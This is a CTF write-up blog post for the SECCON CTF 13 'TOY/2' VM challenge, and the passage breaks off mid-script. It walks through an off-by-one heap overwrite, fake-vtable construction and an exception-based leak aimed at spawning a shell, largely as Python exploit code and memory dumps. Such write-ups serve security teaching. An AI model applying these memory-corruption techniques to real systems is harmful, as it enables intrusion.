@@ -1,0 +1,773 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="theme-color" content="#2ecc71">
+
+
+
+
+
+<title>SECCON CTF 13 Quals - TOY/2 | kileak</title>
+
+
+
+
+
+<meta name="description" content="SECCON CTF 13 Quals - TOY/2">
+
+
+<meta name="keywords" content="seccon, toy2">
+
+
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+
+
+
+
+
+
+<link rel="canonical" href="https://kileak.github.io/ctf/2024/seccon13quals-toy2/">
+<link rel="alternate" type="application/rss+xml" title="kileak" href="https://kileak.github.io/feed.xml" />
+
+
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-4PGFKKP0QW"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-4PGFKKP0QW');
+</script>
+
+
+<script>base_url = "";</script>
+
+  </head>
+  <body class="">
+
+    <main class="main-container">
+
+        <header class="site-header">
+
+  <div class="container txt-center">
+    <a href="#" class="nav-toogle js-menu-trigger sliding-panel-button">
+      <span></span>
+      <span></span>
+      <span></span>
+    </a>
+
+    <nav class="js-menu sliding-panel-content">
+      <ul>
+        <li><a href="/">home</a></li>
+        <li><a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank">youtube</a></li>
+        <li><a href="/feed.xml" target="_blank"><i class="icon icon-feed"></i> feed</a></li>
+      </ul>
+    </nav>
+    <div class="js-menu-screen sliding-panel-fade-screen"></div>
+
+    <a href="/" class="author-thumb dot">
+      <img src="/images/author.jpg" alt="Author thumbnail" class="dot">
+    </a>
+
+    <!--
+    <a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank" class="youtube-thumb dot">
+      <img src="/images/youtube-icon.png" alt="Youtube" class "dot">
+    </a>
+    -->
+
+    
+      <h1 class="post-title">SECCON CTF 13 Quals - TOY/2</h1>
+      <p class="post-meta">Nov 24, 2024</p>
+    
+
+  </div>
+
+</header>
+
+
+        <section class="main-content">
+          <article class="post">
+
+  <div class="post-content container">
+    <blockquote>
+  <p>SECCON CTF 13 Quals - TOY/2
+<!--break--></p>
+
+  <p>author:ptr-yudai</p>
+
+  <p><a href="https://www.pcengines.ch/toy2.htm">TOY/2</a> is a minimalist 16 bit CPU.</p>
+
+  <p>nc toy-2.seccon.games 5000</p>
+
+  <p>Team: Super Guesser</p>
+
+  <p>Attachment: 
+<a href="https://kileak.github.io/assets/seccon13quals/toy2/TOY_2.tar.gz">TOY_2.tar.gz</a> 
+<a href="https://kileak.github.io/assets/seccon13quals/toy2/xpl.py">xpl.py</a></p>
+</blockquote>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+  <span class="n">VM</span> <span class="o">*</span><span class="n">vm</span> <span class="o">=</span> <span class="n">new</span> <span class="n">VM</span><span class="p">();</span>
+  <span class="n">std</span><span class="o">::</span><span class="n">setbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+  <span class="n">std</span><span class="o">::</span><span class="n">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+
+  <span class="k">for</span> <span class="p">(</span><span class="n">Addr</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">MEM_SIZE</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">fread</span><span class="p">(</span><span class="o">&amp;</span><span class="n">vm</span><span class="o">-&gt;</span><span class="n">at</span><span class="p">(</span><span class="n">i</span><span class="p">),</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">stdin</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span>
+      <span class="k">break</span><span class="p">;</span>
+
+  <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[+] Running..."</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
+  <span class="n">try</span> <span class="p">{</span>
+    <span class="n">vm</span><span class="o">-&gt;</span><span class="n">run</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+  <span class="p">}</span> <span class="n">catch</span> <span class="p">(</span><span class="k">const</span> <span class="n">std</span><span class="o">::</span><span class="n">exception</span> <span class="o">&amp;</span><span class="n">e</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[-] Error: "</span> <span class="o">&lt;&lt;</span> <span class="n">e</span><span class="p">.</span><span class="n">what</span><span class="p">()</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[+] Done."</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
+  <span class="n">vm</span><span class="o">-&gt;</span><span class="n">dump_registers</span><span class="p">();</span>
+
+  <span class="n">delete</span> <span class="n">vm</span><span class="p">;</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>The challenge was a VM implementation of the TOY/2 cpu. Code and data are in the same segment (<code class="language-plaintext highlighter-rouge">_mem</code>).</p>
+
+<p>Whilst most operations always check, if the arguments given to the instructions are inside this segment, there’s an off-by-one error in the <code class="language-plaintext highlighter-rouge">stt</code> operator.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">case</span> <span class="mi">13</span><span class="p">:</span> <span class="cm">/* STT */</span>
+  <span class="n">mem_write</span><span class="p">(</span><span class="n">_regs</span><span class="p">.</span><span class="n">a</span> <span class="o">&amp;</span> <span class="p">(</span><span class="n">size</span><span class="p">()</span> <span class="o">-</span> <span class="mi">1</span><span class="p">),</span> <span class="n">_regs</span><span class="p">.</span><span class="n">t</span><span class="p">);</span>
+  <span class="k">break</span><span class="p">;</span></code></pre></figure>
+
+<p>Since it does an 16-bit write, limiting the memory address to <code class="language-plaintext highlighter-rouge">size-1</code> allows us to write one byte outside of the memory region.</p>
+
+<p>Let’s take a look at the layout of that memory region.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x55555556c2a0:	0x0000000000000000	0x0000000000001031
+0x55555556c2b0:	0x0000555555558c70	0x0000000000000000  &lt;= VM vtable / _mem
+0x55555556c2c0:	0x0000000000000000	0x0000000000000000
+0x55555556c2d0:	0x0000000000000000	0x0000000000000000
+0x55555556c2e0:	0x0000000000000000	0x0000000000000000
+0x55555556c2f0:	0x0000000000000000	0x0000000000000000
+0x55555556c300:	0x0000000000000000	0x0000000000000000
+0x55555556c310:	0x0000000000000000	0x0000000000000000
+0x55555556c320:	0x0000000000000000	0x0000000000000000
+
+...
+
+0x55555556d2b0:	0x0000000000000000	0x000055555556c2b8  &lt;= end of _mem / ptr to _mem
+0x55555556d2c0:	0x0000000000001000	0x0000000000000000  &lt;= size of _mem / regs (pc,a,t,c,z)
+0x55555556d2d0:	0x0000000000000000	0x000000000000dd31</code></pre></figure>
+
+<p>So, with this one byte out-of-bound write, we can effectively overwrite the LSB of the <code class="language-plaintext highlighter-rouge">_mem</code> ptr, moving it up- and downwards.</p>
+
+<p>We can use this to first move the <code class="language-plaintext highlighter-rouge">_mem</code> region further down, allowing us to overwrite more data behind <code class="language-plaintext highlighter-rouge">_mem</code> (like the size of memory). We can also move it upwards, which would then allow us to read or overwrite the <code class="language-plaintext highlighter-rouge">vtable</code> of the VM, by which we could let it point to a fake vtable.</p>
+
+<p>Though we cannot leak any addresses from the vm, we can use existing addresses to calculate other addresses from it. In the beginning, we’ll only have a pointer to the challenge itself on the heap (the <code class="language-plaintext highlighter-rouge">vtable</code> pointer) and a pointer to the heap via <code class="language-plaintext highlighter-rouge">_mem ptr</code>.</p>
+
+<p>To do something useful, we’d need a <code class="language-plaintext highlighter-rouge">libc</code> leak. That’s where the <code class="language-plaintext highlighter-rouge">illegal</code> operation can help.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">case</span> <span class="mi">7</span><span class="p">:</span> <span class="cm">/* illegal */</span>
+  <span class="n">throw</span> <span class="n">std</span><span class="o">::</span><span class="n">runtime_error</span><span class="p">(</span><span class="s">"Illegal instruction"</span><span class="p">);</span></code></pre></figure>
+
+<p>This will raise an exception and create an exception object on the heap (behind our current <code class="language-plaintext highlighter-rouge">vm</code> object).</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x55555556d2b0:	0xfe00000000000000	0x000055555556c2c8
+0x55555556d2c0:	0x0000000000001000	0x0000c8fe0fff000a
+0x55555556d2d0:	0x0000000000000000	0x00000000000000a1
+0x55555556d2e0:	0x000000055555556d	0x9b4e6a6ead1198b2
+0x55555556d2f0:	0x0000555555558cb8	0x00007ffff7e0f150
+0x55555556d300:	0x00007ffff7de2a40	0x00007ffff7dfa360
+0x55555556d310:	0x0000000000000000	0x0000000100000001
+0x55555556d320:	0x000055555555737e	0x00005555555572b8
+0x55555556d330:	0x00005555555563e1	0x000055555556d360
+0x55555556d340:	0x474e5543432b2b00	0x00007ffff7df8290
+0x55555556d350:	0x0000000000000000	0x00007fffffffecf0
+0x55555556d360:	0x00007ffff7fabff0	0x000055555556d398 &lt;= libstdc++ ptr
+0x55555556d370:	0x0000000000000000	0x0000000000000041
+0x55555556d380:	0x000000055555556d	0x9b4e6a6ead1198b2
+0x55555556d390:	0x00000000ffffffff	0x206c6167656c6c49
+0x55555556d3a0:	0x7463757274736e69	0x00000000006e6f69</code></pre></figure>
+
+<p>The distance between <code class="language-plaintext highlighter-rouge">libstdc++</code> and <code class="language-plaintext highlighter-rouge">libc</code> will always be constant. So, if we can access those addresses, we could calculate <code class="language-plaintext highlighter-rouge">libc</code> and then create a fake <code class="language-plaintext highlighter-rouge">vtable</code> to execute something like <code class="language-plaintext highlighter-rouge">system("/bin/sh")</code>.</p>
+
+<p>The attack plan would be something like:</p>
+<ul>
+  <li>Overwrite LSB of <code class="language-plaintext highlighter-rouge">_mem</code> and move it downwards</li>
+  <li>Overwrite <code class="language-plaintext highlighter-rouge">size</code> of <code class="language-plaintext highlighter-rouge">_mem</code> so we still have access to <code class="language-plaintext highlighter-rouge">_mem</code> ptr when moving upwards</li>
+  <li>Overwrite LSB of <code class="language-plaintext highlighter-rouge">_mem</code> and point it before the <code class="language-plaintext highlighter-rouge">vm</code></li>
+  <li>Create a fake vtable in <code class="language-plaintext highlighter-rouge">_mem</code> which will start the challenge again when calling <code class="language-plaintext highlighter-rouge">dump_registers</code></li>
+  <li>Raise an exception via operator <code class="language-plaintext highlighter-rouge">7</code></li>
+</ul>
+
+<p>This will get the exception on the heap and lets us send another program, in which we can then do pretty much the same, but this time, we’ll have the exception before our current <code class="language-plaintext highlighter-rouge">vm</code>, which we then can read, calculate <code class="language-plaintext highlighter-rouge">libc</code> from it and do our final <code class="language-plaintext highlighter-rouge">vtable</code> to execute <code class="language-plaintext highlighter-rouge">system("/bin/sh")</code>.</p>
+
+<p>To be able to access data kind of like a variable and not having to “jump over” user data, I separated the code into two segments (code/data). By this we can put values into the <code class="language-plaintext highlighter-rouge">data</code> segment of our code and access it via <code class="language-plaintext highlighter-rouge">0xf00 + offset</code>.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
+  <span class="c1"># code segment
+</span>
+  <span class="c1"># overwrite mem ptr
+</span>  <span class="n">code</span> <span class="o">=</span> <span class="n">lda</span><span class="p">(</span><span class="mh">0xf00</span><span class="p">)</span>
+  <span class="n">code</span> <span class="o">+=</span> <span class="n">tat</span><span class="p">()</span>
+  <span class="n">code</span> <span class="o">+=</span> <span class="n">lda</span><span class="p">(</span><span class="mh">0xf02</span><span class="p">)</span>
+  <span class="n">code</span> <span class="o">+=</span> <span class="n">stt</span><span class="p">()</span>
+
+  <span class="n">code</span> <span class="o">=</span> <span class="n">code</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0xf00</span><span class="p">,</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span>
+
+  <span class="c1"># data segment
+</span>  <span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="mh">0xc800</span><span class="p">)</span>                 <span class="c1"># 0xf00 LSB overwrite value
+</span>  <span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="mh">0xfff</span><span class="p">)</span>                  <span class="c1"># 0xf02 Target address (overwrite _mem ptr)
+</span>
+  <span class="n">code</span> <span class="o">=</span> <span class="n">code</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4096</span><span class="p">,</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span>
+
+  <span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">code</span><span class="p">)</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x55555556d2b0:	0xfe00000000000000	0x000055555556c2c8  &lt;= _mem / _mem ptr
+0x55555556d2c0:	0x0000000000001000	0x0000c8fe0fff0000
+0x55555556d2d0:	0x0000000000000000	0x000000000000dd31</code></pre></figure>
+
+<p>With this, we moved the <code class="language-plaintext highlighter-rouge">_mem</code> pointer now from <code class="language-plaintext highlighter-rouge">0x000055555556c2b8</code> to <code class="language-plaintext highlighter-rouge">0x000055555556c2c8</code>. We also have to take this in consideration for our code, since <code class="language-plaintext highlighter-rouge">pc</code> will be calculated relatively to <code class="language-plaintext highlighter-rouge">_mem</code> (we can do this by just adding a padding into our code here).</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1"># padding for moved mem ptr
+</span><span class="n">code</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span> <span class="o">*</span> <span class="mi">16</span></code></pre></figure>
+
+<p>and then continue our code after this, in which we’ll now overwrite the size of <code class="language-plaintext highlighter-rouge">_mem</code>.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1"># overwrite _mem size
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">lda</span><span class="p">(</span><span class="mh">0xf04</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">)</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="n">sta</span><span class="p">(</span><span class="mh">0x1000</span> <span class="o">+</span> <span class="mi">8</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">)</span>
+
+<span class="c1"># data segment
+</span><span class="n">code</span> <span class="o">=</span> <span class="n">code</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0xf00</span><span class="p">,</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="mh">0xc8fe</span><span class="p">)</span>                 <span class="c1"># 0xf00 LSB overwrite value
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="mh">0xfff</span><span class="p">)</span>                  <span class="c1"># 0xf02 Target address (overwrite _mem ptr)
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="mh">0xffff</span><span class="p">)</span>                 <span class="c1"># 0xf04 new _mem_size</span></code></pre></figure>
+
+<p>Since we have moved <code class="language-plaintext highlighter-rouge">_mem</code> we also have to take the <code class="language-plaintext highlighter-rouge">-0x10</code> into consideration for referencing the offsets, but this will effectively set <code class="language-plaintext highlighter-rouge">_mem.size</code> to <code class="language-plaintext highlighter-rouge">0xffff</code>.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x55555556d2b0:	0xfe00000000000000	0x000055555556c2c8 &lt;= _mem / _mem ptr
+0x55555556d2c0:	0x000000000000ffff	0x0000c8feffff0000 &lt;= _mem size
+0x55555556d2d0:	0x0000000000000000	0x000000000000dd31</code></pre></figure>
+
+<p>Now we can move <code class="language-plaintext highlighter-rouge">_mem</code> upwards, to be able to access <code class="language-plaintext highlighter-rouge">vtable</code> and <code class="language-plaintext highlighter-rouge">_mem ptr</code> at the same time and use this to create a fake vtable, which allows us to raise the exception and re-enter the challenge.</p>
+
+<p>But when moving <code class="language-plaintext highlighter-rouge">_mem</code> upwards, we need to take <code class="language-plaintext highlighter-rouge">pc</code> into consideration again (which would now point to a previous operation), so that we can continue with our code execution. To get around this, we can just add some <code class="language-plaintext highlighter-rouge">ror</code> operations kinda like a <code class="language-plaintext highlighter-rouge">nop-sled</code>. (Also now all “variables” are off by <code class="language-plaintext highlighter-rouge">+0x8</code>).</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1"># padding to increase pc
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">ror</span><span class="p">()</span> <span class="o">*</span> <span class="mi">16</span>
+
+<span class="c1"># move _mem ptr up
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">lda</span><span class="p">(</span><span class="mh">0xf06</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">)</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="n">sta</span><span class="p">(</span><span class="mh">0x1000</span> <span class="o">-</span> <span class="mi">1</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">)</span>
+
+<span class="c1"># read vtable and calculate offset to main
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">lda</span><span class="p">(</span><span class="o">-</span><span class="mh">0x8</span> <span class="o">+</span> <span class="mh">0x8</span><span class="p">)</span>             <span class="c1"># read original vtable (lower 2 bytes)
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">sbc</span><span class="p">(</span><span class="mh">0xf08</span> <span class="o">+</span> <span class="mh">0x8</span><span class="p">)</span>            <span class="c1"># calculate elf base
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">adc</span><span class="p">(</span><span class="mh">0xf0a</span> <span class="o">+</span> <span class="mh">0x8</span><span class="p">)</span>            <span class="c1"># calculate main
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">sta</span><span class="p">(</span><span class="mh">0xe00</span> <span class="o">+</span> <span class="mh">0x8</span><span class="p">)</span>            <span class="c1"># write into mem
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">lda</span><span class="p">(</span><span class="o">-</span><span class="mh">0x8</span> <span class="o">+</span> <span class="mh">0x2</span> <span class="o">+</span> <span class="mh">0x8</span><span class="p">)</span>       <span class="c1"># read original vtable (next 2 bytes)
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">sta</span><span class="p">(</span><span class="mh">0xe00</span> <span class="o">+</span> <span class="mh">0x2</span> <span class="o">+</span> <span class="mh">0x8</span><span class="p">)</span>      <span class="c1"># write into mem
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">lda</span><span class="p">(</span><span class="o">-</span><span class="mh">0x8</span> <span class="o">+</span> <span class="mh">0x4</span> <span class="o">+</span> <span class="mh">0x8</span><span class="p">)</span>       <span class="c1"># read original vtable (next 2 bytes)
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">sta</span><span class="p">(</span><span class="mh">0xe00</span> <span class="o">+</span> <span class="mh">0x4</span> <span class="o">+</span> <span class="mh">0x8</span><span class="p">)</span>      <span class="c1"># write into mem
+</span>
+<span class="c1"># data segment
+</span><span class="n">code</span> <span class="o">=</span> <span class="n">code</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0xf00</span><span class="p">,</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="mh">0xc800</span><span class="p">)</span>                 <span class="c1"># 0xf00 LSB overwrite value (move down)
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="mh">0xfff</span><span class="p">)</span>                  <span class="c1"># 0xf02 Target address (overwrite _mem ptr)
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="mh">0xffff</span><span class="p">)</span>                 <span class="c1"># 0xf04 new _mem_size
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="mh">0xb000</span><span class="p">)</span>                 <span class="c1"># 0xf06 LSB overwrite value (move up)
+</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="mh">0x4c70</span><span class="p">)</span>                 <span class="c1"># 0xf08 original vtable offset
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="mh">0x26d0</span><span class="p">)</span>                 <span class="c1"># 0xf0a offset to main</span></code></pre></figure>
+
+<p>This will move <code class="language-plaintext highlighter-rouge">_mem</code> ptr up just enough, so we can access the original <code class="language-plaintext highlighter-rouge">vtable</code> pointer via <code class="language-plaintext highlighter-rouge">_mem</code>, then calculate the address of <code class="language-plaintext highlighter-rouge">main</code> based on it and write it into <code class="language-plaintext highlighter-rouge">_mem</code> so we can use it as fake vtable afterwards.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x55555556d0b0:	0x0000000000000000	0x00005555555566d0 &lt;= main (fake vtable)
+0x55555556d0c0:	0x0000000000000000	0x0000000000000000
+0x55555556d0d0:	0x0000000000000000	0x0000000000000000
+0x55555556d0e0:	0x0000000000000000	0x0000000000000000</code></pre></figure>
+
+<p>Now, we’ll just have to overwrite <code class="language-plaintext highlighter-rouge">vtable</code> and letting it point to our fake vtable.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1"># overwrite vtable ptr
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">lda</span><span class="p">(</span><span class="mh">0xf0c</span> <span class="o">+</span> <span class="mh">0x8</span><span class="p">)</span>            <span class="c1"># load offset to _mem ptr
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">ldi</span><span class="p">()</span>                       <span class="c1"># read lower 2 bytes of _mem ptr
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">adc</span><span class="p">(</span><span class="mh">0xf12</span> <span class="o">+</span> <span class="mh">0x8</span><span class="p">)</span>            <span class="c1"># add offset to fake vtable
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">sta</span><span class="p">(</span><span class="o">-</span><span class="mh">0x8</span> <span class="o">+</span> <span class="mh">0x8</span><span class="p">)</span>             <span class="c1"># overwrite vtable
+</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="n">lda</span><span class="p">(</span><span class="mh">0xf0e</span> <span class="o">+</span> <span class="mh">0x8</span><span class="p">)</span>            <span class="c1"># copy _mem ptr+2 to vtable+2
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">ldi</span><span class="p">()</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="n">sta</span><span class="p">(</span><span class="o">-</span><span class="mh">0x8</span> <span class="o">+</span> <span class="mh">0x2</span> <span class="o">+</span> <span class="mh">0x8</span><span class="p">)</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="n">lda</span><span class="p">(</span><span class="mh">0xf10</span> <span class="o">+</span> <span class="mh">0x8</span><span class="p">)</span>            <span class="c1"># copy _mem ptr+4 to vtable+4
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">ldi</span><span class="p">()</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="n">sta</span><span class="p">(</span><span class="o">-</span><span class="mh">0x8</span> <span class="o">+</span> <span class="mh">0x4</span> <span class="o">+</span> <span class="mh">0x8</span><span class="p">)</span>
+
+<span class="c1"># trigger invalid instruction
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">op</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+
+<span class="c1"># data segment
+</span><span class="n">code</span> <span class="o">=</span> <span class="n">code</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0xf00</span><span class="p">,</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="mh">0xc800</span><span class="p">)</span>                 <span class="c1"># 0xf00 LSB overwrite value (move down)
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="mh">0xfff</span><span class="p">)</span>                  <span class="c1"># 0xf02 Target address (overwrite _mem ptr)
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="mh">0xffff</span><span class="p">)</span>                 <span class="c1"># 0xf04 new _mem_size
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="mh">0xb000</span><span class="p">)</span>                 <span class="c1"># 0xf06 LSB overwrite value (move up)
+</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="mh">0x4c70</span><span class="p">)</span>                 <span class="c1"># 0xf08 original vtable offset
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="mh">0x26d0</span><span class="p">)</span>                 <span class="c1"># 0xf0a offset to main
+</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="mh">0x1000</span> <span class="o">+</span> <span class="mh">0x8</span><span class="p">)</span>           <span class="c1"># 0xf0c offset to _mem ptr
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="mh">0x1000</span> <span class="o">+</span> <span class="mh">0x2</span> <span class="o">+</span> <span class="mh">0x8</span><span class="p">)</span>     <span class="c1"># 0xf0e offset to _mem ptr + 2
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="mh">0x1000</span> <span class="o">+</span> <span class="mh">0x4</span> <span class="o">+</span> <span class="mh">0x8</span><span class="p">)</span>     <span class="c1"># 0xf10 offset to _mem ptr + 4
+</span><span class="n">code</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="mh">0xe00</span><span class="p">)</span>                  <span class="c1"># 0xf12 offset to fake vtable</span></code></pre></figure>
+
+<p>We’ll be using the existing <code class="language-plaintext highlighter-rouge">_mem</code> pointer for this, since it already points to our vm. We just load 2 bytes from it at a time, calculate the offset to our fake vtable and then overwrite the corresponding two bytes of <code class="language-plaintext highlighter-rouge">vtable</code> with it.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x55555556c2a0:	0x0000000000000000	0x0000000000001031
+0x55555556c2b0:	0x000055555556d0b0	0xd000ef025000ef00 &lt;= vtable
+0x55555556c2c0:	0x0000000000000000	0x0000000000000000
+0x55555556c2d0:	0x40004000fff8eef4	0x4000400040004000
+0x55555556c2e0:	0x4000400040004000	0x4000400040004000
+
+...
+
+0x55555556d0b0:	0x0000000000000000	0x00005555555566d0 &lt;= fake vtable
+0x55555556d0c0:	0x0000000000000000	0x0000000000000000
+0x55555556d0d0:	0x0000000000000000	0x0000000000000000
+0x55555556d0e0:	0x0000000000000000	0x0000000000000000
+0x55555556d0f0:	0x0000000000000000	0x0000000000000000</code></pre></figure>
+
+<p>With everything prepared, we can now trigger the <code class="language-plaintext highlighter-rouge">illegal</code> instruction, which will raise the exception and execute our fake vtable, which will just start again in <code class="language-plaintext highlighter-rouge">main</code> reading our next payload.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">[*] Switching to interactive mode
+[+] Running...
+[+] Done.</code></pre></figure>
+
+<p>The challenge will now create a new <code class="language-plaintext highlighter-rouge">VM</code> object directly behind the <code class="language-plaintext highlighter-rouge">exception</code> object, so we can just repeat the previous process to again read outside of <code class="language-plaintext highlighter-rouge">_mem</code> and getting the <code class="language-plaintext highlighter-rouge">libstdc++</code> pointer and create yet another fake vtable.</p>
+
+<p>We can use the first code again, just changing the heap offsets a bit, since we have a new vm object allocated.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"[+] Done."</span><span class="p">)</span>
+
+<span class="c1"># move _mem ptr down
+</span><span class="n">code</span> <span class="o">=</span> <span class="n">lda</span><span class="p">(</span><span class="mh">0xf00</span><span class="p">)</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="n">tat</span><span class="p">()</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="n">lda</span><span class="p">(</span><span class="mh">0xf02</span><span class="p">)</span>
+<span class="n">code</span> <span class="o">+=</span> <span class="n">stt</span><span class="p">()</span>
+
+<span class="c1"># padding for moved mem ptr
+</span><span class="n">code</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span> <span class="o">*</span> <span class="mi">16</span>
+
+<span class="c1"># overwrite _mem size
